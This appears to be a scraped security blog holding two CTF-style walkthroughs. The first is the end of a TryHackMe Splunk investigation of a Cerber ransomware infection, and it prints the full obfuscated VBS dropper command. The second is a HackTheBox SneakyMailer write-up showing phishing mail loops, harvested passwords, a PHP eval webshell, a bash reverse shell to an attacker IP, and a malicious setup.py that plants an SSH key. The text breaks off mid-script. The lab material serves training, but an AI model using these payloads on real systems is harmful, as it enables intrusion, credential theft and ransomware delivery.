the initial Cerber infection. This file execution creates two additional processes. What is the name of the file?USB插入后，运行了一个可执行文件，这是最初的Cerber 感染。该文件执行创建了两个附加进程，这个文件的名字是什么？ 首先我们确认插入的USB的盘符： 123index&#x3D;botsv1 we8105desk sourcetype&#x3D;XmlWinEventLog:Microsoft-Windows-Sysmon&#x2F;Operational | makemv delim&#x3D;&quot;:&quot; CurrentDirectory | eval drive&#x3D;mvindex(CurrentDirectory,0) | stats count by drive drive count C 298 D 7 插入的USB是D盘，然后就直接提取执行D盘相关文件的日志： 123index&#x3D;botsv1 host&#x3D;&quot;we8105desk&quot; sourcetype&#x3D;&quot;XmlWinEventLog:Microsoft-Windows-Sysmon&#x2F;Operational&quot; CommandLine&#x3D;&quot;*D:\\\\*&quot; | table _time, CommandLine | reverse _time CommandLine 2016/08/24 16:43:12 “C:\\Program Files (x86)\\Microsoft Office\\Office14\\WINWORD.EXE” /n /f “D:\\Miranda_Tate_unveiled.dotm” 2016/08/24 16:56:47 “C:\\Windows\\system32\\rundll32.exe” C:\\Windows\\system32\\shell32.dll,OpenAs_RunDLL D:\\Work Stuff\\013\\013366.pdf 答案是Miranda_Tate_unveiled.dotm 6.4 During the initial Cerber infection a VB script is run. The entire script from this execution, pre-pended by the name of the launching .exe, can be found in a field in Splunk. What is the length in characters of this field?在最初的Cerber感染期间，将运行VB脚本。 可以在Splunk中的一个字段中找到此执行的整个脚本，该脚本之前带有启动.exe的名称。 该字段的字符长度是多少？ 12345index&#x3D;botsv1 host&#x3D;&quot;we8105desk&quot; sourcetype&#x3D;&quot;XmlWinEventLog:Microsoft-Windows-Sysmon&#x2F;Operational&quot; (CommandLine&#x3D;&quot;*D:\\\\*&quot; OR ParentCommandLine&#x3D;&quot;*D:\\\\*&quot;) | eval length&#x3D;len(CommandLine) | table CommandLine, length| sort by -length| head 1 CommandLine length cmd.exe /V /C set “GSI=%APPDATA%%RANDOM%.vbs” &amp;&amp; (for %i in (“DIm RWRL” “FuNCtioN GNbiPp(Pt5SZ1)” “EYnt=45” “GNbiPp=AsC(Pt5SZ1)” “Xn1=52” “eNd fuNCtiON” “SUb OjrYyD9()” “J0Nepq=56” “Dim UJv,G4coQ” “LT=23” “dO WHiLE UJv&lt;&gt;3016-3015” “G4coQ=G4coQ+1” “WSCRiPt.sLEeP(11)” “LoOP” “UsZK0=85” “ENd suB” “fuNctIon J7(BLI4A3)” “K5AU=29” “J7=cHR(BLI4A3)” “XBNutM9=36” “eNd fuNCtiON” “SUb MA(QrG)” “WXCzRz=9” “Dim Jw” “Qt7=34” “Jw=TIMeR+QrG” “Do WhiLE tIMEr&lt;Jw” “WSCRipT.sleEP(6)” “LOOp” “EXdkRkH=78” “enD sUB” “fUnCTion M1p67jL(BwqIM7,Qa)” “Yi=80” “dIM KH,ChnFY,RX,Pg,C6YT(8)” “Cm=7” “C6YT(1)=107” “Rzf=58” “C6YT(5)=115” “BSKoW=10” “C6YT(4)=56” “Cwd6=35” “C6YT(7)=110” “AQ=98” “C6YT(6)=100” “Y6Cm1I=82” “C6YT(2)=103” “JH3F2i=74” “C6YT(8)=119” “JRvsG2s=76” “C6YT(3)=53” “Yh=31” “C6YT(0)=115” “GuvD=47” “Tbvf1=67” “SeT KH=cReATeObject(A9y(“3C3A1D301F2D063708772930033C3C201C2D0A34203B053C0C2D”, “Yo”))” “V2JR=73” “Set ChnFY=KH.GETfilE(BwqIM7)” “RGeJ=68” “SeT Pg=ChnFY.opEnASTExTstReAM(6806-6805,7273-7273)” “CtxOk=82” “seT RX=KH.cREateteXtFiLe(Qa,6566-6565,2508-2508)” “XPL9af=76” “Do uNtil Pg.aTEnDOfStReam” “RX.wRitE J7(OyVNo(GNbiPp(Pg.rEAD(6633-6632)),C6YT(0)))” “LooP” “IQz=49” “RX.cloSe” “CBR1gC7=51” “Pg.cLOSE” “PmG=64” “eNd funCTIOn” “FUNcTION Ql9zEF()” “IBL2=16” “Ql9zEF=secoND(Time)” “MUTkPNJ=41” “End FUNcTiOn” “FUnCtion A9y(Am,T1GCbB)” “CWCH9r=82” “Dim V3sl0m,F4ra,AxFE” “RLLp8R=89” “For V3sl0m=1 To (lEn(Am)/2)” “F4ra=(J7((8270-8232)) &amp; J7((5328/74))&amp;(miD(Am,(V3sl0m+V3sl0m)-1,2)))” “AxFE=(GNbiPp(mID(T1GCbB,((V3sl0m MOd Len(T1GCbB))+1),1)))” “A9y=A9y+J7(OyVNo(F4ra,AxFE))” “NeXT” “DxZ40=89” “enD fUNction” “Sub AylniN()” “N6nzb=92” “DIm GWJCk,Q3y,GKasG0” “FDu=47” “GWJCk=93961822” “UZ=32” “FoR Q3y=1 To GWJCk” “GKasG0=GKasG0+1” “neXt” “B1jq2Hk=63” “If GKasG0=GWJCk tHen” “KXso=18” “MA((-176+446))” “IP4=48” “Yq(A9y(“0B3B1D44626E7E1020055D3C20230A3B0C503D31230C3700593135344D201B53772C39173D475E2826”,”QcOi4XA”))” “YTsWy=31” “elSe” “DO5gpmA=84” “A8=86” “EnD iF” “XyUP=64” “eND SuB” “sUB GKfD3aY(FaddNPJ)” “SDU0BLq=57” “DiM UPhqZ,KbcT” “DxejPK=88” “KbcT=”Drn4AW”” “GROlc7=82” “sET UPhqZ=CREAteOBJecT(A9y(“332A7B05156A211A46243629”,KbcT))” “Gs0g=3” “UPhqZ.OpEn” “TF1=68” “UPhqZ.tyPE=6867-6866” “RDjmY=24” “UPhqZ.wrITe FaddNPJ” “WiFgvS=78” “UPhqZ.SaVeTOfIle RWRL,8725-8723” “AF=4” “UPhqZ.closE” “JC7sf2=1” “Cke4e” “JM=88” “EnD suB” “fuNCtIoN Yq(PDqi1)” “I0=22” “DiM YTwwO,BAU7Cz,Uv,JiYwVG,IK” “GJDnbE=32” “On ErrOR reSume NeXT” “B7bT=1” “Uv=”Tk”” “ELw=73” “sEt YTwwO=CREaTeObjeCT(A9y(“3C07082602241F7A383C0E3807”,Uv))” “K4=62” “GAiF” “IS1cj=19” “Set Dzc0=YTwwO.eNVIrONMEnt(A9y(“013B183400023A”,”EQiWw”))” “D9S=38” “RWRL=Dzc0(A9y(“14630811720C14”,”XU3”))&amp;J7((8002-7910))&amp; Ql9zEF &amp; Ql9zEF” “AtCQ=95” “JiYwVG=”FcQqQ”” “Tf=79” “sEt BAU7Cz=CrEATEoBjECT(A9y(“2E38122329103E1725683B1C3D19123701”,JiYwVG))” “QUY=56” “BAU7Cz.OpeN A9y(“0D0E1E”,”KJ”),PDqi1,7387-7387” “JX2=58” “BAU7Cz.SeTReQuEstHeAdeR A9y(“1F59242828”,”OM8J”),A9y(“0D354C3D356B567A0F6B6B”,”VoL8XF”)” “URkT=71” “BAU7Cz.SEnD()” “QdFeA6=65” “if BAU7Cz.StaTUstExt=A9y(“652840353A542512023C5B3D572F27”,”S5I2A”) then” “PwTLW23=36” “GAiF” “R4xYBS=63” “MA(4)” “PjL6m=46” “GKfD3aY BAU7Cz.ReSpONSEbody” “Fj98=72” “Else” “D7T=91” “IK=”NNXFD0”” “NK=74” “SeT BAU7Cz= CreATeobJECT(A9y(“033125365F3D213E326A68030210121060”,IK))” “QJ=35” “BAU7Cz.oPeN A9y(“2A2F0E”,”TmjZ8d”),A9y(“07351B31556E40785D6F5D735D6F5E715B6F5E795D6E02291B33412B1F26”,”Ao” ),5022-5022” “UMp8=85” “BAU7Cz.SeTReqUesTheadER A9y(“1439190A24”,”AFXwm”),A9y(“371038301A716C5F7B6644”,”LUi”)” “NluUc=93” “BAU7Cz.SENd()” “EOtR=44” “If BAU7Cz.STaTUSTexT=A9y(“03510A3B3A51146F105F163B365E0C”,”OS0x”) THen GKfD3aY BAU7Cz.REsPOnSeBODY” “Q6sMEZ=54” “I9Nl7=56” “end if” “Dq=54” “eND FuNCTioN” “fUNctIon OyVNo(U1,Brt0d)” “SNOW=59” “OyVNo=(U1 ANd noT Brt0d)oR(NOt U1 And Brt0d)” “QTi5K=54” “enD funcTION” “Sub Cke4e()” “WTOyAw=62” “dIM EuM,WIbud,NCiN,Fs8HJ” “A5AT=92” “NCiN=””””” “SX6=93” “WIbud=RWRL &amp; Ql9zEF &amp; A9y(“4A330F3F”,”WdGbOGp”)” “V5B7Zh=92” “M1p67jL RWRL,WIbud” “L13=45” “iF Fs8HJ=”” tHen MA(4)” “CHaK=38” “EuM=”Iqxkf”” “U56m=67” “SEt VP=creATeoBJEcT(A9y(“262B081420010C453521141407”,EuM))” “U5Quw=85” “VP.Run A9y(“1023287B163629755C0D6C06270F1E01536C6E7551”,”UsNL”) &amp; WIbud &amp; NCiN,2912-2912,5755-5755” “A6mfcYL=76” “End sUB” “JoxZ3=43” “AylniN” “suB GAiF()” “G4vzM=95” “Dim DCRml9g, CjoNOY9” “For DCRml9g = 68 To 6000327” “CjoNOY9 = Rvwr + 23 + 35 + 27” “Next” “KK0H=46” “enD sUb”) do @echo %~i)&gt;”!GSI!” &amp;&amp; start “” “!GSI!” 4490 Answer: 4490 6.5 Bob Smith’s workstation (we8105desk) was connected to a file server during the ransomware outbreak. What is the IP address of the file server?在勒索软件爆发期间，鲍勃·史密斯（Bob Smith）的工作站（we8105desk）已连接到文件服务器。 文件服务器的IP地址是什么？ 就是直接过滤fileshare： 12index&#x3D;botsv1 host&#x3D;&quot;we8105desk&quot; sourcetype&#x3D;WinRegistry fileshare | head 1 时间 事件 16/08/24 17:15:18.000 08/24/2016 11:15:18.043 event_status=”(0)The operation completed successfully.” pid=3496 process_image=”c:\\Windows\\explorer.exe” registry_type=”CreateKey” key_path=”HKU\\s-1-5-21-67332772-3493699611-3403467266-1109\\software\\microsoft\\windows\\currentversion\\explorer\\mountpoints2##192.168.250.20#fileshare” data_type=”REG_NONE” data=”” 答案是192.168.250.20 6.6 What was the first suspicious domain visited by we8105desk on 24AUG2016?we8105desk在2016年8月24日访问的第一个可疑域是什么？ 就是DNS记录，排除掉可信域： 123index&#x3D;botsv1 src_ip&#x3D;&quot;192.168.250.100&quot; sourcetype&#x3D;stream:dns record_type&#x3D;A NOT (query&#123;&#125;&#x3D;&quot;*microsoft.com&quot; OR query&#123;&#125;&#x3D;&quot;wpad&quot; OR query&#123;&#125;&#x3D;&quot;*.waynecorpinc.local&quot; OR query&#123;&#125;&#x3D;&quot;isatap&quot; OR query&#123;&#125;&#x3D;&quot;*bing.com&quot; OR query&#123;&#125;&#x3D;&quot;*windows.com&quot; OR query&#123;&#125;&#x3D;&quot;*msftncsi.com&quot;)| table _time, query&#123;&#125;| sort by _time _time query{} 2016/08/24 16:48:12.267 solidaritedeproximite.orgsolidaritedeproximite.org 2016/08/24 16:49:24.308 ipinfo.ioipinfo.io 2016/08/24 17:15:12.668 cerberhhyed5frqa.xmfir0.wincerberhhyed5frqa.xmfir0.win Answer: solidaritedeproximite.org 6.7 The malware downloads a file that contains the Cerber ransomware cryptor code. What is the name of that file?恶意软件下载包含Cerber勒索软件代码的文件。 该文件的名称是什么？ 12index&#x3D;botsv1 src_ip&#x3D;&quot;192.168.250.100&quot; sourcetype&#x3D;suricata http.hostname&#x3D;solidaritedeproximite.org | table _time, http.http_method, http.hostname, http.url _time http.http_method http.hostname http.url 2016/08/24 16:48:13.492 GET solidaritedeproximite.org /mhtr.jpg Answer: mhtr.jpg 6.8 What is the parent process ID of 121214.tmp?121214.tmp的父进程ID是什么？ _time CommandLine ProcessId ParentCommandLine ParentProcessId 2016/08/24 16:48:21 “C:\\Windows\\System32\\cmd.exe” /C START “” “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp” 1476 “C:\\Windows\\System32\\WScript.exe” “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\20429.vbs” 3968 2016/08/24 16:48:21 “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp” 2948 “C:\\Windows\\System32\\cmd.exe” /C START “” “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp” 1476 2016/08/24 16:48:29 “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp” 3828 “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp” 2948 2016/08/24 16:48:41 “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming{35ACA89F-933F-6A5D-2776-A3589FB99832}\\osk.exe” 3836 “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp” 3828 2016/08/24 16:48:41 /d /c taskkill /t /f /im “121214.tmp” &gt; NUL &amp; ping -n 1 127.0.0.1 &gt; NUL &amp; del “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp” &gt; NUL 1280 “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp” 3828 2016/08/24 16:48:41 taskkill /t /f /im “121214.tmp” 1684 /d /c taskkill /t /f /im “121214.tmp” &gt; NUL &amp; ping -n 1 127.0.0.1 &gt; NUL &amp; del “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp” &gt; NUL 1280 2016/08/24 16:48:42 ping -n 1 127.0.0.1 556 /d /c taskkill /t /f /im “121214.tmp” &gt; NUL &amp; ping -n 1 127.0.0.1 &gt; NUL &amp; del “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp” &gt; NUL 1280 Answer: 3968 6.9 Amongst the Suricata signatures that detected the Cerber malware, which signature ID alerted the fewest number of times?在检测到Cerber恶意软件的Suricata签名中，哪个签名ID发出警报的次数最少？ 123index&#x3D;botsv1 cerber sourcetype&#x3D;suricata | stats count by alert.signature, alert.signature_id | sort -count alert.signature alert.signature_id count ETPRO TROJAN Ransomware/Cerber Checkin Error ICMP Response 2816764 2 ETPRO TROJAN Ransomware/Cerber Onion Domain Lookup 2820156 2 ETPRO TROJAN Ransomware/Cerber Checkin 2 2816763 1 Answer: 2816763 6.10 The Cerber ransomware encrypts files located in Bob Smith’s Windows profile. How many .txt files does it encrypt?Cerber勒索软件对Bob Smith的Windows配置文件中的文件进行加密。 它加密多少个.txt文件？ 首先运行： 12index&#x3D;botsv1 host&#x3D;we8105desk sourcetype&#x3D;&quot;XmlWinEventLog:Microsoft-Windows-Sysmon&#x2F;Operational&quot; *.txt | stats count by TargetFilename TargetFilename count C:\\Sysmon._Eula.txt 1 C:\\Sysmon\\AuditPol_AFTER_WE8105DESK.txt 1 C:\\Sysmon\\AuditPol_BEFORE_WE8105DESK.txt 1 C:\\Sysmon\\Eula.txt 1 C:\\Users\\bob.smith.WAYNECORPINC\\Desktop\\2010\\Office 2010 Pro\\Key.txt 1 C:\\Users\\bob.smith.WAYNECORPINC\\Desktop\\2010\\Project 2010\\Key.txt 1 C:\\Users\\bob.smith.WAYNECORPINC\\Desktop\\2010\\Visio 2010\\visio 2010.txt 1 C:\\Users\\bob.smith.WAYNECORPINC\\Desktop\\BootCamp4for7\\Drivers\\Intel\\Chipset._Help.txt 1 C:\\Users\\bob.smith.WAYNECORPINC\\Desktop\\BootCamp4for7\\Drivers\\Intel\\Chipset._readme.txt 1 C:\\Users\\bob.smith.WAYNECORPINC\\Desktop\\BootCamp4for7\\Drivers\\Intel\\Chipset\\Help.txt 1 C:\\Users\\bob.smith.WAYNECORPINC\\Desktop\\BootCamp4for7\\Drivers\\Intel\\Chipset\\Lang\\CHIP\\ARA._license.txt 1 C:\\Users\\bob.smith.WAYNECORPINC\\Desktop\\BootCamp4for7\\Drivers\\Intel\\Chipset\\Lang\\CHIP\\ARA\\license.txt 1 C:\\Users\\bob.smith.WAYNECORPINC\\Desktop\\BootCamp4for7\\Drivers\\Intel\\Chipset\\Lang\\CHIP\\ARB._license.txt 1 C:\\Users\\bob.smith.WAYNECORPINC\\Desktop\\BootCamp4for7\\Drivers\\Intel\\Chipset\\Lang\\CHIP\\ARB\\license.txt 1 C:\\Users\\bob.smith.WAYNECORPINC\\Desktop\\BootCamp4for7\\Drivers\\Intel\\Chipset\\Lang\\CHIP\\CHS._license.txt 1 C:\\Users\\bob.smith.WAYNECORPINC\\Desktop\\BootCamp4for7\\Drivers\\Intel\\Chipset\\Lang\\CHIP\\CHS\\license.txt 1 C:\\Users\\bob.smith.WAYNECORPINC\\Desktop\\BootCamp4for7\\Drivers\\Intel\\Chipset\\Lang\\CHIP\\CHT._license.txt 1 C:\\Users\\bob.smith.WAYNECORPINC\\Desktop\\BootCamp4for7\\Drivers\\Intel\\Chipset\\Lang\\CHIP\\CHT\\license.txt 1 C:\\Users\\bob.smith.WAYNECORPINC\\Desktop\\BootCamp4for7\\Drivers\\Intel\\Chipset\\Lang\\CHIP\\CSY._license.txt 1 C:\\Users\\bob.smith.WAYNECORPINC\\Desktop\\BootCamp4for7\\Drivers\\Intel\\Chipset\\Lang\\CHIP\\CSY\\license.txt 1 我们看到勒索软件会在多个位置加密文件。 要关注Bob Smith的Windows配置文件，请过滤Bob Smith的主文件夹中的* .txt文件： 12index&#x3D;botsv1 host&#x3D;we8105desk sourcetype&#x3D;&quot;XmlWinEventLog:Microsoft-Windows-Sysmon&#x2F;Operational&quot; TargetFilename&#x3D;&quot;C:\\\\Users\\\\bob.smith.WAYNECORPINC\\\\*.txt&quot; | stats dc(TargetFilename) dc(TargetFilename) 406 Answer: 406 6.11 How many distinct PDFs did the ransomware encrypt on the remote file server?勒索软件在远程文件服务器上加密了多少个不同的PDF？ 首先需要确认sourcetype，pdf文件应该是wineventlog： 123index&#x3D;botsv1 *.pdf | stats count by sourcetype | sort -count sourcetype count wineventlog 527 stream:smb 283 XmlWinEventLog:Microsoft-Windows-Sysmon/Operational 50 WinRegistry 3 stream:http 1 然后确定目标： 123index&#x3D;botsv1 *.pdf sourcetype&#x3D;wineventlog | stats count by dest | sort -count dest count we9041srv.waynecorpinc.local 526 we8105desk.waynecorpinc.local 1 我们需要看的应该是we9041srv.waynecorpinc.local 123index&#x3D;botsv1 *.pdf sourcetype&#x3D;wineventlog dest&#x3D;&quot;we9041srv.waynecorpinc.local&quot; | stats count by Source_Address | sort -count Source_Address count 192.168.250.100 525 192.168.2.50 1 然后过滤我们失陷机对其的访问操作： 12index&#x3D;botsv1 sourcetype&#x3D;wineventlog dest&#x3D;&quot;we9041srv.waynecorpinc.local&quot; Source_Address&#x3D;&quot;192.168.250.100&quot; Relative_Target_Name&#x3D;&quot;*.pdf&quot;| stats dc(Relative_Target_Name) dc(Relative_Target_Name) 257 Answer: 257 6.12 What fully qualified domain name (FQDN) does the Cerber ransomware attempt to direct the user to at the end of its encryption phase?Cerber勒索软件尝试在加密阶段结束时将用户引导到哪个完全限定域名（FQDN）？ 这个其实在6.6就已经得到了答案： 123index&#x3D;botsv1 src_ip&#x3D;&quot;192.168.250.100&quot; sourcetype&#x3D;stream:dns record_type&#x3D;A NOT (query&#123;&#125;&#x3D;&quot;*microsoft.com&quot; OR query&#123;&#125;&#x3D;&quot;wpad&quot; OR query&#123;&#125;&#x3D;&quot;*.waynecorpinc.local&quot; OR query&#123;&#125;&#x3D;&quot;isatap&quot; OR query&#123;&#125;&#x3D;&quot;*bing.com&quot; OR query&#123;&#125;&#x3D;&quot;*windows.com&quot; OR query&#123;&#125;&#x3D;&quot;*msftncsi.com&quot;)| table _time, query&#123;&#125;| sort by _time _time query{} 2016/08/24 16:48:12.267 solidaritedeproximite.orgsolidaritedeproximite.org 2016/08/24 16:49:24.308 ipinfo.ioipinfo.io 2016/08/24 17:15:12.668 cerberhhyed5frqa.xmfir0.wincerberhhyed5frqa.xmfir0.win 加密完成后，用户会被引导到cerberhhyed5frqa.xmfir0.win 总结整个流程就是某个用户插入一个USB，word模板dotm文件，产生了可疑进程，下载执行勒索软件，加密文件，加密完成后加密完成后将用户引导至攻击者域名。 参考资料 https://www.aldeid.com/wiki/TryHackMe-BP-Splunk","categories":[],"tags":[{"name":"TryHackMe","slug":"TryHackMe","permalink":"https://darkwing.moe/tags/TryHackMe/"}]},{"title":"SneakyMailer - HackTheBox","slug":"SneakyMailer-HackTheBox","date":"2020-07-22T07:04:24.000Z","updated":"2020-11-30T00:52:26.325Z","comments":true,"path":"2020/07/22/SneakyMailer-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/07/22/SneakyMailer-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/262 10.10.10.197 端口扫描123456789101112131415161718192021222324252627282930313233343536373839$ nmap -sC -sV 10.10.10.197Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-22 12:35 CSTNmap scan report for 10.10.10.197Host is up (0.068s latency).Not shown: 993 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey:| 2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)| 256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)|_ 256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)25/tcp open smtp Postfix smtpd|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,80/tcp open http nginx 1.14.2|_http-server-header: nginx/1.14.2|_http-title: Did not follow redirect to http://sneakycorp.htb143/tcp open imap Courier Imapd (released 2018)|_imap-capabilities: UIDPLUS completed THREAD=ORDEREDSUBJECT OK CHILDREN ACL2=UNION SORT QUOTA STARTTLS ACL THREAD=REFERENCES NAMESPACE UTF8=ACCEPTA0001 IMAP4rev1 IDLE ENABLE CAPABILITY| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US| Subject Alternative Name: email:postmaster@example.com| Not valid before: 2020-05-14T17:14:21|_Not valid after: 2021-05-14T17:14:21|_ssl-date: TLS randomness does not represent time993/tcp open ssl/imap Courier Imapd (released 2018)|_imap-capabilities: UIDPLUS completed THREAD=ORDEREDSUBJECT OK CHILDREN ACL2=UNION SORT QUOTA THREAD=REFERENCES ACL AUTH=PLAIN NAMESPACE UTF8=ACCEPTA0001 IMAP4rev1 IDLE ENABLE CAPABILITY| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US| Subject Alternative Name: email:postmaster@example.com| Not valid before: 2020-05-14T17:14:21|_Not valid after: 2021-05-14T17:14:21|_ssl-date: TLS randomness does not represent time8080/tcp open http nginx 1.14.2|_http-open-proxy: Proxy might be redirecting requests|_http-server-header: nginx/1.14.2|_http-title: Welcome to nginx!Service Info: Host: debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 66.31 seconds 80需要加hosts： 110.10.10.197 sneakycorp.htb pypi提示可以在服务器上装module，这应该是拿到服务器后的利用点 Team那里可以得到一些邮箱，提取出来： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061curl http://sneakycorp.htb/team.php | grep @sneakymailer.htb &gt;&gt; emails.txtcat emails.txt | sed 's/&lt;td&gt;//g' | sed 's/&lt;\\/td&gt;//g' | sed 's/ //g' &gt; email.txtcat email.txttigernixon@sneakymailer.htbgarrettwinters@sneakymailer.htbashtoncox@sneakymailer.htbcedrickelly@sneakymailer.htbairisatou@sneakymailer.htbbriellewilliamson@sneakymailer.htbherrodchandler@sneakymailer.htbrhonadavidson@sneakymailer.htbcolleenhurst@sneakymailer.htbsonyafrost@sneakymailer.htbjenagaines@sneakymailer.htbquinnflynn@sneakymailer.htbchardemarshall@sneakymailer.htbhaleykennedy@sneakymailer.htbtatyanafitzpatrick@sneakymailer.htbmichaelsilva@sneakymailer.htbpaulbyrd@sneakymailer.htbglorialittle@sneakymailer.htbbradleygreer@sneakymailer.htbdairios@sneakymailer.htbjenettecaldwell@sneakymailer.htbyuriberry@sneakymailer.htbcaesarvance@sneakymailer.htbdoriswilder@sneakymailer.htbangelicaramos@sneakymailer.htbgavinjoyce@sneakymailer.htbjenniferchang@sneakymailer.htbbrendenwagner@sneakymailer.htbfionagreen@sneakymailer.htbshouitou@sneakymailer.htbmichellehouse@sneakymailer.htbsukiburks@sneakymailer.htbprescottbartlett@sneakymailer.htbgavincortez@sneakymailer.htbmartenamccray@sneakymailer.htbunitybutler@sneakymailer.htbhowardhatfield@sneakymailer.htbhopefuentes@sneakymailer.htbvivianharrell@sneakymailer.htbtimothymooney@sneakymailer.htbjacksonbradshaw@sneakymailer.htbolivialiang@sneakymailer.htbbrunonash@sneakymailer.htbsakurayamamoto@sneakymailer.htbthorwalton@sneakymailer.htbfinncamacho@sneakymailer.htbsergebaldwin@sneakymailer.htbzenaidafrank@sneakymailer.htbzoritaserrano@sneakymailer.htbjenniferacosta@sneakymailer.htbcarastevens@sneakymailer.htbhermionebutler@sneakymailer.htblaelgreer@sneakymailer.htbjonasalexander@sneakymailer.htbshaddecker@sneakymailer.htbsulcud@sneakymailer.htbdonnasnider@sneakymailer.htb 2525是smtp，根据靶机名以及得到的邮箱列表，可能的利用点 143imap,邮件服务 SMTP钓鱼考察点就是某个员工会点击钓鱼邮件链接，直接使用swaks： 123456789101112131415while read mail; do swaks --to $mail --from it@sneakymailer.htb --header \"Subject: Credentials /Errors\" --body \"goto http://10.10.14.4/\" --server 10.10.10.197; done &lt; email.txt nc -lvvp 80Listening on any address 80 (http)Connection from 10.10.10.197:51354POST / HTTP/1.1Host: 10.10.14.4User-Agent: python-requests/2.23.0Accept-Encoding: gzip, deflateAccept: */*Connection: keep-aliveContent-Length: 185Content-Type: application/x-www-form-urlencodedfirstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt 钓鱼得到的内容解码后： 1234firstName&#x3D;Paul&amp;lastName&#x3D;Byrd&amp;email&#x3D;paulbyrd@sneakymailer.htb&amp;password&#x3D;^(#J@SkFv2[%KhIxKk(Ju&#96;hqcHl&lt;:Ht&amp;rpassword&#x3D;^(#J@SkFv2[%KhIxKk(Ju&#96;hqcHl&lt;:HtUserName ： paulbyrdemail : paulbyrd@sneakymailer.htbpassword : ^(#J@SkFv2[%KhIxKk(Ju&#96;hqcHl&lt;:Ht 很复杂的密码，然而直接钓鱼泄漏出来了。。。 SMTP认证然后用一个邮箱客户端登录，我用的evolution，这里注意邮箱后缀域名加下hosts： 110.10.10.197 sneakycorp.htb sneakymailer.htb 然后在已发送邮件中发现一封password reset邮件： 12Username: developerOriginal-Password: m^AsY7vTKVT+dV1&#123;WOU%@NaHkUAId3]C 子域名扫描扫描子域名可以发现一个dev, 这个后面会用到： 12gobuster vhost -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;seclists&#x2F;Discovery&#x2F;DNS&#x2F;namelist.txt -u sneakycorp.htbFound: dev.sneakycorp.htb (Status: 200) [Size: 13742] FTP get webshell上面得到的developer账号密码可以用于FTP,进去是一个dev目录，应该就是前面dev子域名的代码，我们可以直接传webshell： 123456789➜ SneakyMailer cat miao.php&lt;?php eval(@$_GET['cmd']); ?&gt;ftp&gt; put miao.phplocal: miao.php remote: miao.php227 Entering Passive Mode (10,10,10,197,106,218).150 Ok to send data.226 Transfer complete.31 bytes sent in 0.00 secs (420.4644 kB/s) reverse shell1bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.4/7777 0&gt;&amp;1 developerwww-root切到developer： pypi.sneakycorp.htb在/var/www发现pypi.sneakycorp.htb，把这个也加到hosts访问, 注意直接访问是重定向到主站，需要8080端口： .htpasswdpypi目录有个.htpasswd文件,hashcat解出来pypi密码： 1234567cat .htpasswdpypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR&#x2F;p&#x2F;hashcat -m 1600 hash.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR&#x2F;p&#x2F;:soufianeelhaoui pypi: soufianeelhaoui PyPI现在我们有pypi的密码，就可以上传恶意的package执行代码，参考： https://pypi.org/project/pypiserver/#upload-with-setuptools 整个流程就是通过pypi，执行python代码，将我们的公钥写到low用户的authorized_keys中，然后SSH连接 恶意package123456789101112131415cd &#x2F;tmpmkdir miaopkgcd miaopkgchmod 600 .pypirc# 本机ssh-keygen -b 2048 -t ed25519 -f .&#x2F;key -q -N &quot;&quot;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC6Ew9PQtpGf&#x2F;0V00Yhu4XluLxoLh70CClimoc8IzuxI miao@miaowget http:&#x2F;&#x2F;10.10.14.4:8888&#x2F;.pypircwget http:&#x2F;&#x2F;10.10.14.4:8888&#x2F;setup.py# target &#x2F;tmp&#x2F;miaopkgHOME&#x3D;$(pwd)python3 setup.py sdist register -r local upload -r local .pypirc1234567[distutils]index-servers &#x3D; local[local]repository: http:&#x2F;&#x2F;pypi.sneakycorp.htb:8080username: pypipassword: soufianeelhaoui setup.py12345678910111213141516171819202122232425import setuptoolstry: with open(\"/home/low/.ssh/authorized_keys\", \"a\") as f: f.write(\"\\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC6Ew9PQtpGf/0V00Yhu4XluLxoLh70CClimoc8IzuxI miao@miao\") f.close()except Exception as e: passsetuptools.setup( name=\"miaopkg\", # Replace with your own username version=\"0.0.1\", author=\"Example Author\", author_email=\"author@example.com\", description=\"A small example package\", long_description=\"\", 